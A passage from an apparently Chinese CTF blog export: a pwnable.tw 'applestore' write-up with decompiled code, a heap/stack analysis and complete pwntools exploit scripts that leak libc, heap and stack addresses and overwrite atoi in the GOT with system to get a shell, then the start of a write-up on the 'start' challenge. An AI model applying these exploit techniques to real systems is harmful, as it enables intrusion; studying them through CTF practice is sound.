**v2; // eax MAPDST\n\n  v2 = (char **)malloc(0x10u);\n  v2[1] = p_money;\n  asprintf(v2, \"%s\", p_type);\n  v2[2] = 0;\n  v2[3] = 0;\n  return v2;\n}\n```\n\ncreate的堆块和asprintf生成的堆块关系如下图：\n\n![](applestore-1.png)\n\n#### 1.2.2.2 insert\n\ninsert函数中，将上一步的堆块和全局变量mycart连接起来，组成如下图1.2.2.2-1的关系。\n\n```c\nint *__cdecl insert(int *info_loc)\n{\n  int *result; // eax\n  _DWORD *i; // [esp+Ch] [ebp-4h]\n\n  for ( i = &myCart; i[2]; i = (_DWORD *)i[2] )\n    ;\n  i[2] = info_loc;\n  result = info_loc;\n  info_loc[3] = (int)i;\n  return result;\n}\n```\n\n图1.2.2.2-1\n\n![](applestore-2.png)\n\n当add第二部手机进购物车的时候，就会生成如图1.2.2.2-2的关系：\n\n![](applestore-3.png)\n\n可以看出，添加进购物车的手机信息都被串成了双链表的形式。因此后续的delete和cart就是双链表删除和遍历的操作。\n\n### 1.2.3 delete\n\ndelete函数的功能主要是，根据我们输入的编号，将购物车中对应的商品删除。\n\n```c\nunsigned int delete()\n{\n  signed int v1; // [esp+10h] [ebp-38h]\n  _DWORD *v2; // [esp+14h] [ebp-34h]\n  int v3; // [esp+18h] [ebp-30h]\n  int v4; // [esp+1Ch] [ebp-2Ch]\n  int v5; // [esp+20h] [ebp-28h]\n  char nptr; // [esp+26h] [ebp-22h]\n  unsigned int v7; // [esp+3Ch] [ebp-Ch]\n\n  v7 = __readgsdword(0x14u);\n  v1 = 1;\n  v2 = (_DWORD *)dword_804B070;\n  printf(\"Item Number> \");\n  fflush(stdout);\n  my_read(&nptr, 0x15u);\n  v3 = atoi(&nptr);\n  while ( v2 )\n  {\n    if ( v1 == v3 )\n    {\n      v4 = v2[2];\n      v5 = v2[3];\n      if ( v5 )\n        *(_DWORD *)(v5 + 8) = v4;\n      if ( v4 )\n        *(_DWORD *)(v4 + 12) = v5;\n      printf(\"Remove %d:%s from your shopping cart.\\n\", v1, *v2);\n      return __readgsdword(0x14u) ^ v7;\n    }\n    ++v1;\n    v2 = (_DWORD *)v2[2];\n  }\n  return __readgsdword(0x14u) ^ v7;\n}\n```\n\n### 1.2.4 cart\n\ncart函数的功能是打印我们购物车中已经存在的商品，并且计算购物车中商品的总额，最后将总额返回。\n\n```c\nint cart()\n{\n  signed int v0; // eax\n  signed int v2; // [esp+18h] [ebp-30h]\n  int v3; // [esp+1Ch] [ebp-2Ch]\n  _DWORD *i; // [esp+20h] [ebp-28h]\n  char buf; // [esp+26h] [ebp-22h]\n  unsigned int v6; // [esp+3Ch] [ebp-Ch]\n\n  v6 = __readgsdword(0x14u);\n  v2 = 1;\n  v3 = 0;\n  printf(\"Let me check your cart. ok? (y/n) > \");\n  fflush(stdout);\n  my_read(&buf, 0x15u);\n  if ( buf == 'y' )\n  {\n    puts(\"==== Cart ====\");\n    for ( i = (_DWORD *)dword_804B070; i; i = (_DWORD *)i[2] )\n    {\n      v0 = v2++;\n      printf(\"%d: %s - $%d\\n\", v0, *i, i[1]);\n      v3 += i[1];\n    }\n  }\n  return v3;\n}\n```\n\n### 1.2.5 checkout\n\ncheckout函数，顾名思义，就是结账的地方。不过这里不管你买多少，都只会输出让你下次再结账的提示。\n\n不过我们可以看到，这里有个if分支。当cart的返回值（购物总价值）为7174美元时，就会弹出一个\"一美元买iphone 8\"的提示。并且调用了asprintf和insert两个函数，将一美元的iphone加入购物车列表中，最后将购物车总价值改为7175.\n\n```c\nunsigned int checkout()\n{\n  int v1; // [esp+10h] [ebp-28h]\n  char *v2; // [esp+18h] [ebp-20h]\n  int v3; // [esp+1Ch] [ebp-1Ch]\n  unsigned int v4; // [esp+2Ch] [ebp-Ch]\n\n  v4 = __readgsdword(0x14u);\n  v1 = cart();\n  if ( v1 == 7174 )\n  {\n    puts(\"*: iPhone 8 - $1\");\n    asprintf(&v2, \"%s\", \"iPhone 8\");\n    v3 = 1;\n    insert(&v2);\n    v1 = 7175;\n  }\n  printf(\"Total: $%d\\n\", v1);\n  puts(\"Want to checkout? Maybe next time!\");\n  return __readgsdword(0x14u) ^ v4;\n}\n```\n\n这里有一个很奇怪的点，跟add函数中添加一部手机的操作不一样。\n\n- add函数中是申请一块堆内存用于存放加入购物车的手机信息\n- 而iphone 8的信息是存在栈空间V2处的，而这个V2又会被加入到之前的链表中。因此一个栈空间地址被写入了堆中，而栈是不断在变化的，因此就出现了一段可能被控制的内存，即V2附近。\n\n由以上代码中的信息，我们可以得到如下图所示栈空间的布局：\n\n![](applestore-4.png)\n\n#### 漏洞点\n\n> checkout里存放在栈上的iphone 8信息就是本题的漏洞点，因为栈的地址被写入了堆中。\n\n这段栈空间在checkout函数返回后，会被其他函数使用。因此堆中指向的栈空间信息是可能被我们任意更改的。\n\n而本题恰好给我们提供了两个函数：cart和delete，分别用于打印和删除（在链表中执行unlink操作时即任意地址写），可以被我们利用来泄露信息和任意地址写限定值（或限定地址写任意值）。\n\n## 1.3 触发漏洞\n\n为了触发漏洞，必须使checkout的iphone 8分支被执行。也就是在执行checkout之前，我们必须add够正好7174美元的手机。手机有4种价格：199, 299, 399, 499。那么怎么搭配这四种价格凑齐7174美元，就需要使用各自的方法了。这里提供几种途径：\n\n- Z3求解器\n- matlab\n- wolf mathematics\n- 靠各位的智力脑算+手算...\n\n这里借用一下我男票算到的结果：6 * 199 + 20 * 299 = 7174\n\n触发脚本如下：\n\n```python\nfrom pwn import *\ncontext(arch='i386',os='linux',log_level='debug')\n\nmyelf = ELF('applestore')\nmyps = process(myelf.path)\n\nadd = '2'\ndelete = '3'\ncart = '4'\ncheckout = '5'\n\ndef mysend(op,payload):\n    myps.sendlineafter('>',op)\n    myps.sendlineafter('>',payload)\n\nfor i in range(6):\n    mysend(add,'1')\nfor i in range(20):\n    mysend(add,'2')\nmysend(checkout,'y')\nmyps.recv()\nmyps.interactive()\n```\n\n执行该脚本，得到如下结果，进入了1美元买iphone8的分支：\n\n```shell\n20: iPhone 6 Plus - $299\n21: iPhone 6 Plus - $299\n22: iPhone 6 Plus - $299\n23: iPhone 6 Plus - $299\n24: iPhone 6 Plus - $299\n25: iPhone 6 Plus - $299\n26: iPhone 6 Plus - $299\n*: iPhone 8 - $1\nTotal: $7175\nWant to checkout? Maybe next time!\n> $  \n```\n\n此时，程序回到了handler分支，checkout的函数栈已经被释放，因此iphone 8的栈空间接下来可能存在两种可能：\n\n- 1、这段栈空间的值没被覆盖，那么iphone 8 的栈块信息是还在的，此时查看链表或者删除链表中该项也许不会有问题。（没有尝试）\n- 2、这段栈空间被分配给了新函数，并且新函数覆盖上了新值。那么此时对整个链表进行查看或删除iphone 8这一项时，就会出现问题。\n\n我们执行4（cart查看购物车），等于将刚刚chekout的栈分配给了cart函数。那么就会出现如下错误（如果使用delete删除最后一项，也会出错）：\n\n```shell\nTotal: $7175\nWant to checkout? Maybe next time!\n> $ 4\n[DEBUG] Sent 0x2 bytes:\n    '4\\n'\n[DEBUG] Received 0x24 bytes:\n    'Let me check your cart. ok? (y/n) > '\nLet me check your cart. ok? (y/n) > $ y\n······\n20: iPhone 6 Plus - $299\n21: iPhone 6 Plus - $299\n22: iPhone 6 Plus - $299\n23: iPhone 6 Plus - $299\n24: iPhone 6 Plus - $299\n25: iPhone 6 Plus - $299\n26: iPhone 6 Plus - $299\n27: �f\\x89p\\x0c\\x89x\\x0e\\x05- $-136495008\n[*] Got EOF while reading in interactive\n$  \n```\n\n出错的原因是，iphone8相关的数据都存在栈上，在checkout函数退出后，栈上的数据被cart函数的局部变量覆盖。导致cart中遍历访问链表时，访问到iphone 8时访问了非法的地址。\n\n# 2 利用\n\n1.2.5节漏洞点中阐述了这个漏洞可以用来泄露信息以及有约束地写。\n\n- 1、如果我们把iphone 8数据所在的栈空间覆盖为构造的特定数据，就可以打印（泄露）我们想要的内容。比如说libc。（后面需要用到堆地址，所以这里还需泄露堆、以及栈空间的地址）\n- 2、有约束地写，由于got表可写，因此我们一定是利用这个任意地址写去覆写got表项。\n\n## 2.1 信息泄露- cart\n\n如下图所示，精心布置cart函数的栈帧，控制ebp-0x20处连续16个字节的值（在IDA中查看cart函数的伪码可知，ebp-0x20 ~ ebp-0x10空间是输入buf，可控）。如图中红色栈块所示，cart函数打印到栈上的块时，会将got表中puts函数的地址打印出来。并且由于fd不为空，会继续以mycart偏移8字节处作为一个新块，去打印info_loc的地址，此时就将堆的地址泄露出来了（当然也可以像泄露puts地址一样，去泄露堆地址）。\n\n利用泄露puts函数地址的方法，可以逐步泄露其他信息。\n\n![](applestore-5.png)\n\n### 2.1.1 泄露libc和堆地址\n\n```python\nfrom pwn import *\ncontext(arch='i386',os='linux',log_level='debug')\n\nmyelf = ELF('applestore')\nmylibc = ELF('/lib32/libc-2.23.so')\nmyps = process(myelf.path)\n\nadd = '2'\ndelete = '3'\ncart = '4'\ncheckout = '5'\n\ndef mysend(op,payload):\n    myps.sendlineafter('> ',op)\n    myps.sendlineafter('> ',payload)\n\nfor i in range(6):\n    mysend(add,'1')\nfor i in range(20):\n    mysend(add,'2')\nmysend(checkout,'y')\n\npayload = 'y\\x00'+p32(myelf.got['puts'])+p32(1)+p32(0x0804B070)+p32(1)\nmysend(cart,payload)\n\nmyps.recvuntil('27: ')\nlibc_addr = u32(myps.recv(4))-mylibc.symbols['puts']\nmyps.recvuntil('28: ')\nheap_addr = u32(myps.recv(4))\n##修正heap地址\n#heap_addr = u32(myps.recv(44)) - 0x490\n\nlog.warn('libc_addr:0x%x' % libc_addr)\nlog.warn('heap_addr:0x%x' % heap_addr)\n\ngdb.attach(myps,'b * 0x08048BEB')\nmyps.interactive()\n```\n\n打印出的两个地址如下：\n\n```shell\n[!] libc_addr:0xf7d5a000\n[!] heap_addr:0x830c490\n```\n\n在执行脚本过程中弹出的gdb调试终端框中，执行vmmap，查看libc的起始地址为0xf7d5a000。使用heap chunks查看第一个堆的地址（0x830c008 - 0x8 = 0x830c000），并对上述打印的堆地址修正（0x830c000 = 0x830c490 - 0x490，已更改到上述代码中）：\n\n```bash\ngef➤  vmmap\nStart      End        Offset     Perm Path\n0xf7d5a000 0xf7f07000 0x00000000 r-x /lib32/libc-2.23.so\n0xf7f07000 0xf7f08000 0x001ad000 --- /lib32/libc-2.23.so\n0xf7f08000 0xf7f0a000 0x001ad000 r-- /lib32/libc-2.23.so\n0xf7f0a000 0xf7f0b000 0x001af000 rw- /lib32/libc-2.23.so\n\ngef➤  heap chunks\nChunk(addr=0x830c008, size=0x408, flags=PREV_INUSE)\n    [0x0830c008     3e 20 3a 20 90 c4 30 08 c7 20 2d 20 24 30 0a 08    > : ..0.. - $0..]\nChunk(addr=0x830c410, size=0x18, flags=PREV_INUSE)\n    [0x0830c410     90 c4 30 08 c7 00 00 00 28 c4 30 08 68 b0 04 08    ..0.....(.0.h...]\nChunk(addr=0x830c428, size=0x18, flags=PREV_INUSE)\n    [0x0830c428     40 c4 30 08 c7 00 00 00 50 c4 30 08 10 c4 30 08    @.0.....P.0...0.]\nChunk(addr=0x830c440, size=0x10, flags=PREV_INUSE)\n    [0x0830c440     69 50 68 6f 6e 65 20 36 00 00 00 00 19 00 00 00    iPhone 6........]\n```\n\n### 2.1.2 泄露栈地址\n\n第26个节点的fd中存放的是第27个节点的地址（即栈中某个地址）。\n\n接着在1.3.1节中弹出的gdb调试框中，打印esp和ebp的值，分别为0xfffd4038和0xfffd4078。由此我们推测栈空间的地址应该是由0xfffd开头的，然后去打印出的堆chunks中寻找\"fd ff\"字样。仅在addr=0x830c8a8的chunk中找到一个\"0xfffd4058\"，这就是一个栈空间的地址。那么该地址值距离堆起始地址的偏移是0x830c8a8 + 0x8 - 0x830c000 = 0x8b0：\n\n```shell\nChunk(addr=0x830c890, size=0x18, flags=PREV_INUSE)\n    [0x0830c890     10 c9 30 08 2b 01 00 00 a8 c8 30 08 40 c8 30 08    ..0.+.....0.@.0.]\nChunk(addr=0x830c8a8, size=0x18, flags=PREV_INUSE)\n    [0x0830c8a8     c0 c8 30 08 2b 01 00 00 58 40 fd ff 90 c8 30 08    ..0.+...X@....0.]\nChunk(addr=0x830c8c0, size=0x18, flags=PREV_INUSE)\n    [0x0830c8c0     69 50 68 6f 6e 65 20 36 20 50 6c 75 73 00 00 00    iPhone 6 Plus...]\nChunk(addr=0x830c8d8, size=0x10, flags=PREV_INUSE)\n    [0x0830c8d8     69 50 68 6f 6e 65 20 38 00 00 00 00 29 00 00 00    iPhone 8....)...]\nChunk(addr=0x830c8e8, size=0x28, flags=PREV_INUSE)\n    [0x0830c8e8     b0 a7 f0 f7 b0 a7 f0 f7 00 00 00 00 11 07 02 00    ................]\nChunk(addr=0x830c910, size=0x18, flags=)\n    [0x0830c910     69 50 68 6f 6e 65 20 36 20 50 6c 75 73 00 00 00    iPhone 6 Plus...]\nChunk(addr=0x830c928, size=0x206e0, flags=PREV_INUSE)  ←  top chunk\ngef➤  p $esp\n$1 = (void *) 0xfffd4038\ngef➤  p $ebp\n$2 = (void *) 0xfffd4078\n```\n\n由上述内容可知，我们想要的栈空间地址在堆起始地址heap_addr+0x8b0处。因此在2.1.1的python代码中再添加一步，就可以泄露栈空间地址：\n\n```python\nfrom pwn import *\ncontext(arch='i386',os='linux',log_level='debug')\n\nmyelf = ELF('applestore')\nmylibc = ELF('/lib32/libc-2.23.so')\nmyps = process(myelf.path)\n\nadd = '2'\ndelete = '3'\ncart = '4'\ncheckout = '5'\n\ndef mysend(op,payload):\n    myps.sendlineafter('> ',op)\n    myps.sendlineafter('> ',payload)\n\nfor i in range(6):\n    mysend(add,'1')\nfor i in range(20):\n    mysend(add,'2')\nmysend(checkout,'y')\n\npayload = 'y\\x00'+p32(myelf.got['puts'])+p32(1)+p32(0x0804B070)+p32(1)\nmysend(cart,payload)\n\nmyps.recvuntil('27: ')\nlibc_addr = u32(myps.recv(4))-mylibc.symbols['puts']\nmyps.recvuntil('28: ')\nheap_addr = u32(myps.recv(4)) - 0x490\n\npayload = 'y\\x00' + p32(heap_addr + 0x8b0) + p32(1) + p32(0x0804B070) + p32(1)\nmysend(cart,payload)\n\nmyps.recvuntil('27: ')\nstack_addr = u32(myps.recv(4))\n\nlog.warn('libc_addr:0x%x' % libc_addr)\nlog.warn('heap_addr:0x%x' % heap_addr)\nlog.warn('satck_addr:0x%x' % stack_addr)\n\ngdb.attach(myps,'b * 0x08048BEB')\nmyps.interactive()\n```\n\n得到如下结果：\n\n```shell\n[!] libc_addr:0xf7d48000\n[!] heap_addr:0x9603000\n[!] satck_addr:0xffb3e518\n===========================================================\nChunk(addr=0x9603890, size=0x18, flags=PREV_INUSE)\n    [0x09603890     10 39 60 09 2b 01 00 00 a8 38 60 09 40 38 60 09    .9`.+....8`.@8`.]\nChunk(addr=0x96038a8, size=0x18, flags=PREV_INUSE)\n    [0x096038a8     c0 38 60 09 2b 01 00 00 18 e5 b3 ff 90 38 60 09    .8`.+........8`.]\nChunk(addr=0x96038c0, size=0x18, flags=PREV_INUSE)\n    [0x096038c0     69 50 68 6f 6e 65 20 36 20 50 6c 75 73 00 00 00    iPhone 6 Plus...]\nChunk(addr=0x96038d8, size=0x10, flags=PREV_INUSE)\n    [0x096038d8     69 50 68 6f 6e 65 20 38 00 00 00 00 29 00 00 00    iPhone 8....)...]\nChunk(addr=0x96038e8, size=0x28, flags=PREV_INUSE)\n    [0x096038e8     b0 87 ef f7 b0 87 ef f7 00 00 00 00 11 07 02 00    ................]\nChunk(addr=0x9603910, size=0x18, flags=)\n    [0x09603910     69 50 68 6f 6e 65 20 36 20 50 6c 75 73 00 00 00    iPhone 6 Plus...]\nChunk(addr=0x9603928, size=0x206e0, flags=PREV_INUSE)  ←  top chunk\ngef➤  p $esp\n$1 = (void *) 0xffb3e4f8\ngef➤  p $ebp\n$2 = (void *) 0xffb3e538\n```\n\n## 2.2 任意地址写 - delete\n\n以下图为例，假如我们要删除info_loc_1这个堆块，则必须执行如下几条命令，将其从链表中拆除：\n\n```c\ninfo_loc_2.bk = info_loc_1.bk\ninfo_loc.fd = info_loc_1.fd\n```\n\n如果只用当前要被删除的项info_loc_1来表示，相当于：\n\n```c\ninfo_loc_1.fd[3] = info_loc_1.bk\ninfo_loc_a.bk[2] = info_loc_1.fd\n//简写为:\nfd[3] = bk\nbk[2] = fd\n```\n\n![](applestore-6.png)\n\n如下图，可以形象地描述任意地址写的两种情况，实际利用使选择任何一种都可。\n\n![](applestore-7.png)\n\n### 2.2.1 泄露ebp地址\n\n下面验证一下handler下的函数在被调用时，其ebp是一样的：\n\n```python\nfrom pwn import *\ncontext(arch='i386',os='linux',log_level='debug')\n\nmyelf = ELF('applestore')\nmylibc = ELF('/lib32/libc-2.23.so')\nmyps = process(myelf.path)\n\nadd = '2'\ndelete = '3'\ncart = '4'\ncheckout = '5'\n\ndef mysend(op,payload):\n    myps.sendlineafter('> ',op)\n    myps.sendlineafter('> ',payload)\n\nfor i in range(6):\n    mysend(add,'1')\nfor i in range(20):\n    mysend(add,'2')\nmysend(checkout,'y')\n\npayload = 'y\\x00'+p32(myelf.got['puts'])+p32(1)+p32(0x0804B070)+p32(1)\nmysend(cart,payload)\n\nmyps.recvuntil('27: ')\nlibc_addr = u32(myps.recv(4))-mylibc.symbols['puts']\nmyps.recvuntil('28: ')\nheap_addr = u32(myps.recv(4)) - 0x490\n\npayload = 'y\\x00' + p32(heap_addr + 0x8b0) + p32(1) + p32(0x0804B070) + p32(1)\nmysend(cart,payload)\n\nmyps.recvuntil('27: ')\nstack_addr = u32(myps.recv(4))\nebp_addr = stack_addr + 0x20\n\nlog.warn('libc_addr:0x%x' % libc_addr)\nlog.warn('heap_addr:0x%x' % heap_addr)\nlog.warn('satck_addr:0x%x' % stack_addr)\nlog.warn('ebp_addr:0x%x' % ebp_addr)\n\ngdb.attach(myps,'b * 0x080489C0 \\nc \\np $ebp')\nmysend(delete,'3')\n\nmyps.interactive()\n```\n\n如下图，发现ebp地址对得上，说明delete函数中的ebp确实跟之前函数的ebp是一致的：\n\n```shell\n[!] libc_addr:0xf7d5f000\n[!] heap_addr:0x8c89000\n[!] satck_addr:0xffa9f2d8\n[!] ebp_addr:0xffa9f2f8\n=========================================================\n[#0] 0x80489c0 → delete()\n[#1] 0x8048c46 → handler()\n[#2] 0x8048cf5 → main()\n──────────────────────────────────────────────────────\n$1 = (void *) 0xffa9f2f8\ngef➤  \n```\n\n### 2.2.2 劫持ebp到got表\n\n泄露完ebp地址后，就可以利用delete函数去更改栈空间中存放的old ebp，从而使函数退出时，实现ebp劫持。\n\n劫持到哪儿呢？当然是got表啦！通过IDA查看该二进制程序中got表的地址是0x0804B000至0x0804B040，因此got表底部为0x0804B044。\n\n将ebp劫持到got表底部的验证代码如下：\n\n```python\nfrom pwn import *\ncontext(arch='i386',os='linux',log_level='debug')\n\nmyelf = ELF('applestore')\nmylibc = ELF('/lib32/libc-2.23.so')\nmyps = process(myelf.path)\n\nadd = '2'\ndelete = '3'\ncart = '4'\ncheckout = '5'\n\ndef mysend(op,payload):\n    myps.sendlineafter('> ',op)\n    myps.sendlineafter('> ',payload)\n\nfor i in range(6):\n    mysend(add,'1')\nfor i in range(20):\n    mysend(add,'2')\nmysend(checkout,'y')\n\npayload = 'y\\x00'+p32(myelf.got['puts'])+p32(1)+p32(0x0804B070)+p32(1)\nmysend(cart,payload)\n\nmyps.recvuntil('27: ')\nlibc_addr = u32(myps.recv(4))-mylibc.symbols['puts']\nmyps.recvuntil('28: ')\nheap_addr = u32(myps.recv(4)) - 0x490\n\npayload = 'y\\x00' + p32(heap_addr + 0x8b0) + p32(1) + p32(0x0804B070) + p32(1)\nmysend(cart,payload)\n\nmyps.recvuntil('27: ')\nstack_addr = u32(myps.recv(4))\nebp_addr = stack_addr + 0x20\n\nfor i in range (23):\n    mysend(delete,'1')\n\ngdb.attach(myps,'b * 0x08048A6F \\nc \\np $ebp')\npayload = '4\\x00' + p32(myelf.got['puts']) + p32(1) + p32(ebp_addr-0xc) + p32(0x0804B044)\nmysend(delete,payload)\n\nmyps.interactive()\n```\n\n在gdb窗口中，验证old ebp确实被替换成了我们想要的0x0804B044（got表尾地址）。\n\n```shell\ngef➤  p $ebp\n$1 = (void *) 0xffba66e8\ngef➤  p $esp\n$2 = (void *) 0xffba66a0\ngef➤  x/20wx 0xffba66e8\n0xffba66e8:\t0x0804b044\t0x08048c46\t0xffba6706\t0x00000015\n0xffba66f8:\t0xffba6718\t0xf7e26020\t0x00000003\t0x0a333918\n0xffba6708:\t0xf7e26000\t0x080486f7\t0x08048e23\t0x00000006\n0xffba6718:\t0xffba6774\t0x87bfaa00\t0xf7f8edbc\t0xf7f001e5\n0xffba6728:\t0xffba6748\t0x08048cf5\t0x0804b068\t0x00000000\ngef➤  x/20wx 0xffba66a0\n0xffba66a0:\t0x08048f98\t0x00000004\t0x0804b028\t0x00000000\n0xffba66b0:\t0x00000004\t0xffba66c8\t0x00000004\t0xffba66dc\n0xffba66c0:\t0x0804b044\t0x00346706\t0x0804b028\t0x00000001\n0xffba66d0:\t0xffba66dc\t0x0804b044\t0x0000000a\t0x87bfaa00\n0xffba66e0:\t0xf7f8d000\t0xf7f8d000\t0x0804b044\t0x08048c46\n```\n\n### 2.2.3 劫持ebp并覆写got表\n\n上述将ebp劫持到got表尾后，程序回到了handler中，函数如下。可以看到which_phone变量在ebp-0x22处（此时ebp-0x22正好在got表中），因此我们可以通过which_phone的输入去更改got表中的内容。\n\n如果我们能把atoi改成system，并且把which_phone的内容改成\"sh\"，那么就能在atoi(&which_phone)时获得shell。\n\n```c\nunsigned int handler()\n{\n  char which_phone; // [esp+16h] [ebp-22h]\n  unsigned int v2; // [esp+2Ch] [ebp-Ch]\n\n  v2 = __readgsdword(0x14u);\n  while ( 1 )\n  {\n    printf(\"> \");\n    fflush(stdout);\n    my_read(&which_phone, 0x15u);\n    switch ( atoi(&which_phone) )\n    { ······\n```\n\ngot表最后几项内容：\n\n```assembly\n.got.plt:0804B030 9C B0 04 08                   off_804B030     dd offset exit          ; DATA XREF: _exit↑r\n.got.plt:0804B034 A0 B0 04 08                   off_804B034     dd offset __libc_start_main\n.got.plt:0804B034                                                                       ; DATA XREF: ___libc_start_main↑r\n.got.plt:0804B038 A4 B0 04 08                   off_804B038     dd offset memset        ; DATA XREF: _memset↑r\n.got.plt:0804B03C A8 B0 04 08                   off_804B03C     dd offset asprintf      ; DATA XREF: _asprintf↑r\n.got.plt:0804B040 AC B0 04 08                   off_804B040     dd offset atoi          ; DATA XREF: _atoi↑r\n.got.plt:0804B040                               _got_plt        ends\n.got.plt:0804B040\n.data:0804B044                               ; =======================================================\n```\n\natoi函数是got表中最后一项，它的上一项是asprintf。,令asprintf的地址为ebp-0x22，则构造which_phone为\"sh\\x00\\x00\" + (mylibc.symbols['system'] + libc_addr)，就可以将asprintf和atoi表项分别覆盖为\"sh\\x00\\x00\"和\"system函数\"。因此当执行switch括号中的atoi(&which_phone)时，相当于执行了system(\"sh\")。\n\n跟2.2.2中劫持ebp到got表的位置不同，这里需将ebp劫持到myelf.got['asprintf']+0x22，才能使其满足上述条件。\n\n因此payload为：\n\n```python\npayload = \"2\\x00\" + p32(myelf.got['puts']) + p32(1) + p32(ebp_addr - 0xc) + p32(myelf.got['asprintf']+0x22)\n```\n\n# 3 EXP\n\n## 3.1 本地\n\n```python\nfrom pwn import *\ncontext(arch='i386',os='linux',log_level='debug')\n\nmyelf = ELF('applestore')\nmylibc = ELF('/lib32/libc-2.23.so')\nmyps = process(myelf.path)\n\nadd = '2'\ndelete = '3'\ncart = '4'\ncheckout = '5'\n\ndef mysend(op,payload):\n    myps.sendlineafter('> ',op)\n    myps.sendlineafter('> ',payload)\n\nfor i in range(6):\n    mysend(add,'1')\nfor i in range(20):\n    mysend(add,'2')\nmysend(checkout,'y')\n\npayload = 'y\\x00'+p32(myelf.got['puts'])+p32(1)+p32(0x0804B070)+p32(1)\nmysend(cart,payload)\n\nmyps.recvuntil('27: ')\nlibc_addr = u32(myps.recv(4))-mylibc.symbols['puts']\nmyps.recvuntil('28: ')\nheap_addr = u32(myps.recv(4)) - 0x490\n\npayload = 'y\\x00' + p32(heap_addr + 0x8b0) + p32(1) + p32(0x0804B070) + p32(1)\nmysend(cart,payload)\n\nmyps.recvuntil('27: ')\nstack_addr = u32(myps.recv(4))\nebp_addr = stack_addr + 0x20\n\nfor i in range (23):\n    mysend(delete,'1')\n\npayload = '4\\x00' + p32(myelf.got['puts']) + p32(1) + p32(ebp_addr-0xc) + p32(myelf.got['asprintf']+0x22)\nmysend(delete,payload)\n\nwhich_phone = \"sh\\x00\\x00\" + p32(mylibc.symbols['system'] + libc_addr)\nmyps.sendlineafter('> ',which_phone)\nmyps.interactive()\n```\n\n## 3.2 远程\n\n```python\nfrom pwn import *\ncontext(arch='i386',os='linux',log_level='debug')\n\nmyelf = ELF('applestore')\nmylibc = ELF('../libc_32.so.6')\nmyps = remote('chall.pwnable.tw',10104)\n\nadd = '2'\ndelete = '3'\ncart = '4'\ncheckout = '5'\n\ndef mysend(op,payload):\n    myps.sendlineafter('> ',op)\n    myps.sendlineafter('> ',payload)\n\nfor i in range(6):\n    mysend(add,'1')\nfor i in range(20):\n    mysend(add,'2')\nmysend(checkout,'y')\n\npayload = 'y\\x00'+p32(myelf.got['puts'])+p32(1)+p32(0x0804B070)+p32(1)\nmysend(cart,payload)\n\nmyps.recvuntil('27: ')\nlibc_addr = u32(myps.recv(4))-mylibc.symbols['puts']\nmyps.recvuntil('28: ')\nheap_addr = u32(myps.recv(4)) - 0x490\n\npayload = 'y\\x00' + p32(heap_addr + 0x8b0) + p32(1) + p32(0x0804B070) + p32(1)\nmysend(cart,payload)\n\nmyps.recvuntil('27: ')\nstack_addr = u32(myps.recv(4))\nebp_addr = stack_addr + 0x20\n\nfor i in range (23):\n    mysend(delete,'1')\n\npayload = '4\\x00' + p32(myelf.got['puts']) + p32(1) + p32(ebp_addr-0xc) + p32(myelf.got['asprintf']+0x22)\nmysend(delete,payload)\n\nwhich_phone = \"sh\\x00\\x00\" + p32(mylibc.symbols['system'] + libc_addr)\nmyps.sendlineafter('> ',which_phone)\nmyps.interactive()\n```\n\n# 4 reference\n\n[C语言alarm()函数：设置信号传送闹钟](http://c.biancheng.net/cpp/html/334.html)\n\n[asprintf](https://blog.csdn.net/yuan08shandong/article/details/50580834)\n","tags":["heap"],"categories":["CTF"]},{"title":"pwnable.tw之start-ORW-3x17","url":"/2020/03/04/startORW317/","content":"\n这里把pwnable.tw上前面的几个题放在一起写篇博客，分别是：\n\n- start\n- orw\n- 3x17\n\n# 1 start\n\n## 1.1 题目\n\nhttps://pwnable.tw/challenge/#1\n\n## 1.2 分析\n\n首先，查看文件属性和开启的保护措施：\n\n![](start1.png)\n\n运行起来试试：\n\n![](start2.png)\n\nIDA查看二进制文件start：\n\n![](start3.png)\n\n![](start4.png)\n\n发现除了_start和_exit没有熟悉的main函数，使用IDA查看伪代码也不是一个正常的函数，原因在于这是一个纯汇编代码。\n\n因此我们需要看懂这段汇编都做了些什么：\n\n1    压了_exit函数的地址\n\n2    清eax,ebx,ecx,edx\n\n3    压字符串，20个字节\n\n4    分别给eax,ebx,ecx,edx赋值(4,1,esp,20),然后int 80h系统调用\n\n5    清ebx,给eax,edx赋值（3，60），然后int 80h系统调用\n\n6    esp加20个字节收回栈空间\n\n7    根据栈上的返回地址（_exit）返回\n\n可以看到有两次系统调用（eax是系统调用号，然后ebx，ecx，edx，esx，edi分别放置系统调用的参数）。查表可知4对应的系统调用是write，3对应的是read。\n\n因此以上4和5可以翻译成：\n\n```c\nwrite(1,esp,20); // 从栈上读20个字节到标准输出（读内存）\nread(0,esp,60);  // 从标准输入写60个字节到栈上（写内存）\n```\n\n很明显是个栈溢出，read的60个字节会覆盖到返回地址exit。\n\n![](start5.png)\n\n## 1.3 利用\n\nexit被覆盖后，就控制了eip，此时应该让eip指向哪儿才能get shell呢？当然是指向我们构造的一段shellcode，shellcode应该放哪儿呢？如果放在栈上，但此时我们并不知道栈的地址，那么能不能泄露栈地址呢？再看一下汇编代码：\n\n![](start6.png)\n\n第一次执行完retn之后，esp指向下图位置：\n\n![](start7.png)\n\n如果此时从08048070处开始执行，就可以将old esp的值打印出来，old esp = esp+4。并且可以继续从此esp指向的位置写0x3C字节，如下图所示，esp往上是第二次的输入，我们可以好好构造这次输入，让下次执行retn时，再一次劫持eip（即ret addr），将ret addr覆盖为shellcode addr即可。\n\n![](start8.png)\n\n现在重新理一下，oldesp是write系统调用时泄露出来的，因此shellcode addr是old esp+0x14。那么现在需要找一段合适的shellcode来get shell。\n\n在http://shell-storm.org/shellcode/找到一段长度合适的shellcode如下：\n\n![](start9.png)\n\n![](start10.png)\n\nexp如下：\n\n![](start11.png)\n\n执行结果如下：\n\n![](start12.png)\n\n![](start13.png)\n\n## 1.4 记录\n\n### 1.4.1 pwntools的使用\n\nhttps://pwntools.readthedocs.io/en/stable/about.html\n\nhttp://brieflyx.me/2015/python-module/pwntools-intro/\n\npwntools的cyclic：\n\nhttps://www.cnblogs.com/liuyimin/p/7379985.html\n\n### 1.4.2 gdb-peda的使用\n\n[https://introspelliam.github.io/2017/08/03/pwn/gdb%E7%9A%84%E8%B0%83%E8%AF%95%E4%B8%8E%E4%BD%BF%E7%94%A8/](https://introspelliam.github.io/2017/08/03/pwn/gdb的调试与使用/)\n\npwntools + gdb：\n\nhttp://docs.pwntools.com/en/stable/gdb.html?highlight=gdb#module-pwnlib.gdb\n\n### 1.4.3 shellcode database\n\nhttp://shell-storm.org/shellcode/\n\n# 2 orw\n\n## 2.1 题目\n\nhttps://pwnable.tw/challenge/#2\n\n## 2.2 